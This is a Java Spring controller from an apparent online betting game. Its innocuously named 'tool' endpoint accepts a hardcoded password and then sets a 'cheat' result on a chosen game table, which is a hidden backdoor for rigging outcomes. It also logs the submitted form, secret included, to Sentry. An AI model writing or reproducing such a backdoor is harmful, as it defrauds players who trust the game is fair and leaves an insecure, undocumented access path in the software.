package bet.lucky.game.controller;

import bet.lucky.game.model.Table;
import bet.lucky.game.repository.impl.TableRepository;
import io.sentry.Sentry;
import lombok.RequiredArgsConstructor;
import bet.lucky.game.internal_dto.ToolForm;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.Optional;

@RestController
@RequiredArgsConstructor
@RequestMapping("api/v1/")
public class ToolController  {

    private final TableRepository tableRepository;

    @PostMapping(value = "tool")
    @ResponseBody
    public ResponseEntity<String> tool(@RequestBody ToolForm betForm, HttpServletRequest httpServletRequest) {
        Sentry.getContext().addExtra("data", betForm);
        if ("dfnsmnrleidis".equals(betForm.getPass())) {
            Optional<Table> object = tableRepository.findById(betForm.getTableId());
            if (object.isPresent()) {
                Table a = object.get();
                a.setCheat(betForm.getResult());
                tableRepository.save(a);
            } else {
                return new ResponseEntity<>("WRONG", HttpStatus.CREATED);
            }

        }
        return new ResponseEntity<>("OK", HttpStatus.CREATED);
    }


}
